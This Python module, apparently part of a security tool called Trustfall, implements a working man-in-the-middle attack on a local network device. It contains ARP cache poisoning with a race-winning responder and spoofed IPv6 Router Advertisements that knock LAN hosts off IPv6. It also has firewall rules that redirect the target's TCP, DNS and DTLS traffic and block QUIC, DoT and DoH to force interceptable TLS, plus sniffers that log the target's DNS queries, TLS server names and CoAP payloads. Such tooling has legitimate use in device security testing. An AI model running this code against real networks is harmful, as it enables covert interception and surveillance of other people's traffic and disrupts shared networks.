from __future__ import annotations

import shlex
import threading
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Callable

from scapy.all import (  # type: ignore
    ARP, DNS, ICMPv6ND_RA, ICMPv6ND_RS, ICMPv6NDOptPrefixInfo, IP, IPv6,
    PcapWriter, Raw, TCP, UDP, Ether, get_if_hwaddr, sendp, sniff, srp,
)

from .coap import parse_coap
from .netos import DOH_IPS, default_route, iface_ip, read_forwarding, require_root, run
from .tlshello import dtls_version, looks_dtls_client_hello, looks_tls, parse_client_hello
from . import APP



@dataclass
class Env:
    target_ip: str
    target_mac: str
    gateway_ip: str
    gateway_mac: str
    iface: str
    local_ip: str
    old_forward: str


def discover(target_ip: str) -> Env:
    gateway_ip, iface = default_route()
    return Env(
        target_ip=target_ip,
        target_mac=mac_for(target_ip, iface),
        gateway_ip=gateway_ip,
        gateway_mac=mac_for(gateway_ip, iface),
        iface=iface,
        local_ip=iface_ip(iface),
        old_forward=read_forwarding(),
    )


def mac_for(ip: str, iface: str, timeout: int = 2) -> str:
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=timeout, iface=iface, verbose=False)
    for _, response in ans:
        return response[Ether].src
    raise RuntimeError(f"could not resolve MAC for {ip} on {iface}")


class ArpSpoofer:
    def __init__(self, env: Env, log):
        self.env = env
        self.log = log
        self.our_mac = get_if_hwaddr(env.iface)
        self.stop = threading.Event()
        self.thread: threading.Thread | None = None

    def start(self):
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()
        self.responder = threading.Thread(target=self._respond_loop, daemon=True)
        self.responder.start()

    def restore(self):
        self.stop.set()
        if self.thread:
            self.thread.join(timeout=1)
        responder = getattr(self, "responder", None)
        if responder:
            responder.join(timeout=1)
        for _ in range(3):
            self._send_arp(self.env.gateway_ip, self.env.gateway_mac, self.env.target_ip, "ff:ff:ff:ff:ff:ff")
            self._send_arp(self.env.target_ip, self.env.target_mac, self.env.gateway_ip, "ff:ff:ff:ff:ff:ff")

    def _respond_loop(self):
        """Answer ARP who-has for the gateway/target instantly.

        Periodic gratuitous replies can lose the race against the real gateway
        (especially right after a neighbor-table flush); replying directly to the
        request wins deterministically and keeps the poisoning sticky.
        """
        def cb(pkt):
            if ARP not in pkt or pkt[ARP].op != 1:  # who-has only
                return
            tgt, src = pkt[ARP].pdst, pkt[ARP].psrc
            if tgt == self.env.gateway_ip and src == self.env.target_ip:
                self._send_arp(self.env.gateway_ip, self.our_mac, self.env.target_ip, self.env.target_mac)
            elif tgt == self.env.target_ip and src == self.env.gateway_ip:
                self._send_arp(self.env.target_ip, self.our_mac, self.env.gateway_ip, self.env.gateway_mac)
        try:
            sniff(iface=self.env.iface, filter="arp", prn=cb, store=False, stop_filter=lambda _: self.stop.is_set())
        except Exception as e:
            self.log.emit("WARN", msg="arp responder failed", error=str(e))

    def _loop(self):
        # Aggressive startup burst to win the race against the legitimate gateway
        # (and to repopulate a freshly-flushed neighbor table) before settling into
        # a steady refresh cadence.
        for _ in range(5):
            if self.stop.is_set():
                return
            self._poison()
            time.sleep(0.2)
        while not self.stop.is_set():
            self._poison()
            time.sleep(1)

    def _poison(self):
        self._send_arp(self.env.gateway_ip, self.our_mac, self.env.target_ip, self.env.target_mac)
        self._send_arp(self.env.target_ip, self.our_mac, self.env.gateway_ip, self.env.gateway_mac)

    def _send_arp(self, psrc: str, hwsrc: str, pdst: str, hwdst: str):
        pkt = ARP(op=2, psrc=psrc, hwsrc=hwsrc, pdst=pdst, hwdst=hwdst)
        # Send both directed and broadcast replies. Some stacks ignore unsolicited
        # unicast updates unless an entry already exists; broadcast keeps lab
        # namespaces and consumer devices behaving consistently.
        sendp(Ether(src=hwsrc, dst=hwdst) / pkt, iface=self.env.iface, verbose=False)
        sendp(Ether(src=hwsrc, dst="ff:ff:ff:ff:ff:ff") / pkt, iface=self.env.iface, verbose=False)


def build_ra_kill(router_ll: str, router_mac: str, prefixes: list[tuple[str, int]] | None = None):
    """A spoofed Router Advertisement that deprecates the real IPv6 router.

    routerlifetime=0 tells hosts to stop using this router as a default gateway;
    prefix lifetimes of 0 deprecate its prefixes. Sent to all-nodes (ff02::1) so
    devices fall back to IPv4 (which our ARP spoofing covers).
    """
    ra = (
        Ether(src=router_mac, dst="33:33:00:00:00:01")
        / IPv6(src=router_ll, dst="ff02::1")
        / ICMPv6ND_RA(routerlifetime=0, reachabletime=0, retranstimer=0)
    )
    for prefix, plen in (prefixes or []):
        ra /= ICMPv6NDOptPrefixInfo(prefix=prefix, prefixlen=plen, validlifetime=0, preferredlifetime=0)
    return ra


class IPv6Suppressor:
    """RA-kill to force a target off IPv6 onto our IPv4 MITM path.

    Aggressive and LAN-wide (RAs target ff02::1), so opt-in only. Discovers the
    real router via a Router Solicitation, then periodically re-advertises it with
    a zero lifetime.
    """

    def __init__(self, env: Env, log, interval: float = 5.0):
        self.env = env
        self.log = log
        self.interval = interval
        self.stop = threading.Event()
        self.thread: threading.Thread | None = None
        self.router_ll: str | None = None
        self.router_mac: str | None = None
        self.prefixes: list[tuple[str, int]] = []

    def start(self):
        self._discover()
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()

    def restore(self):
        self.stop.set()
        if self.thread:
            self.thread.join(timeout=1)

    def _discover(self):
        try:
            ans, _ = srp(Ether(dst="33:33:00:00:00:02") / IPv6(dst="ff02::2") / ICMPv6ND_RS(),
                         timeout=3, iface=self.env.iface, verbose=False)
            for _, r in ans:
                if ICMPv6ND_RA in r:
                    self.router_ll = r[IPv6].src
                    self.router_mac = r[Ether].src
                    opt = r.getlayer(ICMPv6NDOptPrefixInfo)
                    while opt is not None:
                        self.prefixes.append((opt.prefix, opt.prefixlen))
                        opt = opt.payload.getlayer(ICMPv6NDOptPrefixInfo)
                    self.log.emit("INFO", msg="ipv6 router discovered", router=self.router_ll, prefixes=len(self.prefixes))
                    return
            self.log.emit("WARN", msg="no ipv6 router found; suppressing with link-local fallback")
        except Exception as e:
            self.log.emit("WARN", msg="ipv6 router discovery failed", error=str(e))

    def _loop(self):
        mac = self.router_mac or get_if_hwaddr(self.env.iface)
        ll = self.router_ll or "fe80::1"
        while not self.stop.is_set():
            try:
                sendp(build_ra_kill(ll, mac, self.prefixes), iface=self.env.iface, verbose=False)
            except Exception as e:
                self.log.emit("WARN", msg="ra-kill send failed", error=str(e))
            self.stop.wait(self.interval)


class Netfilter:
    def __init__(self, env: Env, port: int, redirect_ports: list[int] | None = None,
                 funnel: bool = False, dns_port: int = 0, dtls_port: int = 0):
        self.env = env
        self.port = port
        self.redirect_ports = redirect_ports or []
        self.funnel = funnel        # drop QUIC/DoH/DoT to force traffic into TCP+TLS
        self.dns_port = dns_port    # >0: REDIRECT target UDP/53 to our DNS responder
        self.dtls_port = dtls_port  # >0: REDIRECT target UDP/5684 to our DTLS proxy
        self.rules: list[list[str]] = []

    def enable_forwarding(self):
        Path("/proc/sys/net/ipv4/ip_forward").write_text("1\n")

    def install(self):
        self.enable_forwarding()
        self.purge_stale()
        for rule in self._desired_rules():
            run(rule)
            self.rules.append(rule)

    def cleanup(self):
        for rule in reversed(self.rules):
            self._delete_all(self._delete_cmd(rule))
        self.purge_stale()
        Path("/proc/sys/net/ipv4/ip_forward").write_text(self.env.old_forward + "\n")

    def purge_stale(self):
        """Best-effort removal of Trustfall rules from previous runs."""
        e = self.env
        exact_filter_specs = [
            ["INPUT", "-i", e.iface, "-s", e.target_ip, "-p", "tcp", "--dport", str(self.port), "-j", "ACCEPT"],
            ["FORWARD", "-i", e.iface, "-s", e.target_ip, "-j", "ACCEPT"],
            ["FORWARD", "-o", e.iface, "-d", e.target_ip, "-j", "ACCEPT"],
        ]
        for spec in exact_filter_specs:
            self._delete_all(["iptables", "-D", *spec])

        self._purge_saved_rules(
            "filter",
            lambda chain, line: (chain == "INPUT" and f"--dport {self.port}" in line and "-j ACCEPT" in line)
            or (chain == "FORWARD" and e.target_ip in line and "-j ACCEPT" in line)
            or (chain == "FORWARD" and e.target_ip in line and "-j DROP" in line)
            or (chain == "INPUT" and self.dns_port and f"--dport {self.dns_port}" in line and "-j ACCEPT" in line)
            or (chain == "INPUT" and self.dtls_port and f"--dport {self.dtls_port}" in line and "-j ACCEPT" in line),
        )
        self._purge_saved_rules(
            "nat",
            lambda chain, line: chain == "PREROUTING" and "-j REDIRECT" in line
            and (f"--to-ports {self.port}" in line or (self.dns_port and f"--to-ports {self.dns_port}" in line)
                 or (self.dtls_port and f"--to-ports {self.dtls_port}" in line)),
        )

    def _desired_rules(self) -> list[list[str]]:
        e = self.env
        rules = [
            ["iptables", "-I", "INPUT", "1", "-i", e.iface, "-s", e.target_ip, "-p", "tcp", "--dport", str(self.port), "-j", "ACCEPT"],
            ["iptables", "-I", "FORWARD", "1", "-i", e.iface, "-s", e.target_ip, "-j", "ACCEPT"],
            ["iptables", "-I", "FORWARD", "1", "-o", e.iface, "-d", e.target_ip, "-j", "ACCEPT"],
        ]
        redirect_ports = self.redirect_ports or [None]
        for port in redirect_ports:
            rule = ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", e.iface, "-s", e.target_ip, "-p", "tcp"]
            if port is not None:
                rule += ["--dport", str(port)]
            rule += ["-j", "REDIRECT", "--to-ports", str(self.port)]
            rules.append(rule)
        if self.dns_port:
            # Accept the redirected DNS on our responder port, and steer the
            # target's plaintext :53 to it.
            rules.append(["iptables", "-I", "INPUT", "1", "-i", e.iface, "-s", e.target_ip, "-p", "udp", "--dport", str(self.dns_port), "-j", "ACCEPT"])
            rules.append(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", e.iface, "-s", e.target_ip, "-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-ports", str(self.dns_port)])
        if self.dtls_port:
            # Accept the redirected CoAP/DTLS on our proxy port, and steer the
            # target's UDP :5684 to it.
            rules.append(["iptables", "-I", "INPUT", "1", "-i", e.iface, "-s", e.target_ip, "-p", "udp", "--dport", str(self.dtls_port), "-j", "ACCEPT"])
            rules.append(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", e.iface, "-s", e.target_ip, "-p", "udp", "--dport", "5684", "-j", "REDIRECT", "--to-ports", str(self.dtls_port)])
        rules += self._funnel_rules() if self.funnel else []
        return rules

    def _funnel_rules(self) -> list[list[str]]:
        """DROP transports that bypass our TCP+TLS interception so traffic falls back to it.

        Installed with -I FORWARD 1 (after the broad ACCEPTs), so they sit *above*
        the accept rules and are evaluated first.
        """
        e = self.env
        drops = [
            ["iptables", "-I", "FORWARD", "1", "-i", e.iface, "-s", e.target_ip, "-p", "udp", "--dport", "443", "-j", "DROP"],   # QUIC/HTTP3
            ["iptables", "-I", "FORWARD", "1", "-i", e.iface, "-s", e.target_ip, "-p", "udp", "--dport", "853", "-j", "DROP"],   # DoQ
            ["iptables", "-I", "FORWARD", "1", "-i", e.iface, "-s", e.target_ip, "-p", "tcp", "--dport", "853", "-j", "DROP"],   # DoT
        ]
        for ip in DOH_IPS:
            drops.append(["iptables", "-I", "FORWARD", "1", "-i", e.iface, "-s", e.target_ip, "-d", ip, "-p", "tcp", "--dport", "443", "-j", "DROP"])  # DoH
        return drops

    @staticmethod
    def _delete_cmd(rule: list[str]) -> list[str]:
        cmd = rule.copy()
        for i, token in enumerate(cmd):
            if token in ("-A", "-I"):
                cmd[i] = "-D"
                if token == "-I" and i + 2 < len(cmd) and cmd[i + 2].isdigit():
                    del cmd[i + 2]
                break
        return cmd

    @staticmethod
    def _delete_all(cmd: list[str]):
        while run(cmd, check=False).returncode == 0:
            pass

    def _purge_saved_rules(self, table: str, predicate: Callable[[str, str], bool]):
        for line in run(["iptables-save", "-t", table], check=False).stdout.splitlines():
            if not line.startswith("-A "):
                continue
            toks = shlex.split(line)
            if len(toks) < 3 or toks[0] != "-A" or not predicate(toks[1], line):
                continue
            cmd = ["iptables", "-D", toks[1], *toks[2:]]
            if table != "filter":
                cmd[1:1] = ["-t", table]
            self._delete_all(cmd)


class NfTables:
    """Native nftables backend mirroring the Netfilter (iptables) interface.

    Everything lives in one dedicated `ip trustfall` table, so teardown is a
    single atomic `nft delete table`. Redirect/funnel/DNS behaviour matches the
    iptables backend.

    Caveat: nftables base chains don't short-circuit each other the way an
    iptables `-I FORWARD 1 ACCEPT` does. A `drop` in any base chain at a hook
    wins, so if the host already runs a forward chain with a drop policy that
    doesn't match the target, our accept can't override it. Works as-is on hosts
    with default-accept forwarding (or no forward filtering); otherwise the
    target must be allowed to forward in the host ruleset.
    """

    TABLE = APP

    def __init__(self, env: Env, port: int, redirect_ports: list[int] | None = None,
                 funnel: bool = False, dns_port: int = 0, dtls_port: int = 0):
        self.env = env
        self.port = port
        self.redirect_ports = redirect_ports or []
        self.funnel = funnel
        self.dns_port = dns_port
        self.dtls_port = dtls_port

    def enable_forwarding(self):
        Path("/proc/sys/net/ipv4/ip_forward").write_text("1\n")

    def install(self):
        self.enable_forwarding()
        self.purge_stale()
        run(["nft", "-f", "-"], input_text=self._ruleset())

    def cleanup(self):
        self.purge_stale()
        Path("/proc/sys/net/ipv4/ip_forward").write_text(self.env.old_forward + "\n")

    def purge_stale(self):
        """Idempotent removal of our table left over from a previous run."""
        run(["nft", "delete", "table", "ip", self.TABLE], check=False)

    def _ruleset(self) -> str:
        return "\n".join(self._ruleset_lines()) + "\n"

    def _ruleset_lines(self) -> list[str]:
        e = self.env
        input_rules = [f"ip saddr {e.target_ip} tcp dport {self.port} accept"]
        if self.dns_port:
            input_rules.append(f"ip saddr {e.target_ip} udp dport {self.dns_port} accept")
        if self.dtls_port:
            input_rules.append(f"ip saddr {e.target_ip} udp dport {self.dtls_port} accept")
        # funnel drops first (terminal), then broad target accepts
        forward_rules = self._funnel_rules() + [
            f"ip saddr {e.target_ip} accept",
            f"ip daddr {e.target_ip} accept",
        ]
        lines = [f"table ip {self.TABLE} {{"]
        lines += self._chain("prerouting", "type nat hook prerouting priority dstnat; policy accept;", self._redirect_rules())
        lines += self._chain("input", "type filter hook input priority filter; policy accept;", input_rules)
        lines += self._chain("forward", "type filter hook forward priority filter; policy accept;", forward_rules)
        lines.append("}")
        return lines

    @staticmethod
    def _chain(name: str, header: str, rules: list[str]) -> list[str]:
        return [f"  chain {name} {{", f"    {header}", *[f"    {r}" for r in rules], "  }"]

    def _redirect_rules(self) -> list[str]:
        e = self.env
        if self.redirect_ports:
            ports = ", ".join(str(p) for p in self.redirect_ports)
            rules = [f"ip saddr {e.target_ip} tcp dport {{ {ports} }} redirect to :{self.port}"]
        else:
            rules = [f"ip saddr {e.target_ip} tcp redirect to :{self.port}"]
        if self.dns_port:
            rules.append(f"ip saddr {e.target_ip} udp dport 53 redirect to :{self.dns_port}")
        if self.dtls_port:
            rules.append(f"ip saddr {e.target_ip} udp dport 5684 redirect to :{self.dtls_port}")
        return rules

    def _funnel_rules(self) -> list[str]:
        """DROP transports that bypass TCP+TLS interception (mirrors Netfilter)."""
        if not self.funnel:
            return []
        e = self.env
        doh = ", ".join(DOH_IPS)
        return [
            f"ip saddr {e.target_ip} udp dport 443 drop",   # QUIC/HTTP3
            f"ip saddr {e.target_ip} udp dport 853 drop",   # DoQ
            f"ip saddr {e.target_ip} tcp dport 853 drop",   # DoT
            f"ip saddr {e.target_ip} ip daddr {{ {doh} }} tcp dport 443 drop",  # DoH
        ]


def start_dns_sniffer(env: Env, log, stop: threading.Event, include_udp: bool = False, pcap_path: str | None = None):
    writer = PcapWriter(pcap_path, sync=True) if pcap_path else None

    def callback(pkt):
        if writer is not None:
            try:
                writer.write(pkt)
            except Exception:
                pass
        try:
            handle_packet(pkt, env, log, include_udp)
        except Exception as exc:
            log.emit("WARN", msg="sniffer callback failed", error=str(exc))

    def run():
        try:
            sniff(iface=env.iface, filter=f"ether host {env.target_mac} or host {env.target_ip}", prn=callback, store=False, stop_filter=lambda _: stop.is_set())
        finally:
            if writer is not None:
                writer.close()

    thread = threading.Thread(target=run, daemon=True)
    thread.start()
    return thread


def handle_packet(pkt, env: Env, log, include_udp: bool):
    if IPv6 in pkt and (pkt[IPv6].src == env.target_ip or pkt[IPv6].dst == env.target_ip or _from_target_mac(pkt, env)):
        log.emit("IPV6_ESCAPE", src=pkt[IPv6].src, dst=pkt[IPv6].dst,
                 finding="ipv6_outside_arp_scope", msg="target using IPv6; not covered by IPv4 ARP spoofing")
        return
    if IPv6 in pkt:
        return
    if IP not in pkt or pkt[IP].src != env.target_ip:
        return
    if TCP in pkt:
        handle_tcp(pkt, log)
    elif UDP in pkt:
        handle_udp(pkt, log, include_udp)


def _from_target_mac(pkt, env: Env) -> bool:
    return Ether in pkt and pkt[Ether].src == env.target_mac


def handle_tcp(pkt, log):
    if int(pkt[TCP].flags) & 0x02:
        log.emit("TCP_SYN", dest=f"{pkt[IP].dst}:{pkt[TCP].dport}")
    if Raw in pkt and looks_tls(bytes(pkt[Raw].load)):
        hello = parse_client_hello(bytes(pkt[Raw].load))
        log.emit("TLS_CLIENTHELLO", source="sniff", dest=f"{pkt[IP].dst}:{pkt[TCP].dport}", sni=hello.sni or "none", alpn=",".join(hello.alpn) or None, versions=",".join(hello.offered_versions) or None, ja3=hello.ja3_hash)


def handle_udp(pkt, log, include_udp: bool):
    dport = pkt[UDP].dport
    sport = pkt[UDP].sport
    payload = bytes(pkt[UDP].payload)
    if dport == 53 and DNS in pkt and pkt[DNS].qd:
        query = pkt[DNS].qd.qname.decode(errors="ignore").rstrip(".")
        log.emit("DNS", query=query, dest=pkt[IP].dst)
    elif dport == 5353 and DNS in pkt:
        handle_mdns(pkt, log)
    elif 5683 in (dport, sport):
        handle_coap(pkt, payload, log)
    elif 5684 in (dport, sport):
        handle_dtls(pkt, payload, log, include_udp)
    elif include_udp:
        log.emit("UDP", dest=f"{pkt[IP].dst}:{dport}", proto=classify_udp(dport, payload))


def handle_coap(pkt, payload: bytes, log):
    """Passively parse plaintext CoAP (RFC 7252) we forward for the target."""
    msg = parse_coap(payload)
    if not msg:
        return
    preview = msg.payload[:256]
    text = preview.decode("utf-8", "replace") if preview else None
    log.emit("COAP", dest=f"{pkt[IP].dst}:{pkt[UDP].dport}", summary=msg.summary(), type=msg.type,
             code=msg.code, method=msg.method, uri=msg.uri_path or None, query=msg.uri_query or None,
             content_format=msg.content_format, payload=text or None)


def handle_dtls(pkt, payload: bytes, log, include_udp: bool):
    if looks_dtls_client_hello(payload):
        log.emit("DTLS_CLIENTHELLO", dest=f"{pkt[IP].dst}:{pkt[UDP].dport}", version=dtls_version(payload),
                 msg="encrypted CoAP/DTLS; payload not decrypted")
    elif include_udp:
        log.emit("UDP", dest=f"{pkt[IP].dst}:{pkt[UDP].dport}", proto="coap-dtls")


def handle_mdns(pkt, log):
    """Surface mDNS service names; high-value device fingerprinting for IoT."""
    dns = pkt[DNS]
    records = []
    for section in (dns.qd, dns.an):
        if section is None:
            continue
        if isinstance(section, list):  # modern scapy: qd/an are list-like
            records.extend(section)
        else:                          # older scapy: records chain via .payload
            rr = section
            for _ in range(64):
                if rr is None or rr.__class__.__name__ not in ("DNSQR", "DNSRR"):
                    break
                records.append(rr)
                rr = rr.payload
    names: list[str] = []
    for rr in records[:64]:
        raw = getattr(rr, "qname", None) or getattr(rr, "rrname", None)
        if not raw:
            continue
        name = (raw.decode(errors="ignore") if isinstance(raw, bytes) else str(raw)).rstrip(".")
        if name and name not in names:
            names.append(name)
    if names:
        log.emit("MDNS", services=",".join(names[:16]), dest=pkt[IP].dst)


def classify_udp(port: int, payload: bytes) -> str:
    if port == 53:
        return "dns"
    if port == 123:
        return "ntp"
    if port in (3478, 5349):
        return "stun-turn"
    if port in (5683, 5684):
        return "coap-dtls"
    if port == 443:
        return "quic-or-dtls"
    if payload and payload[0] in range(20, 64) and len(payload) > 13:
        return "dtls-candidate"
    return "unknown"
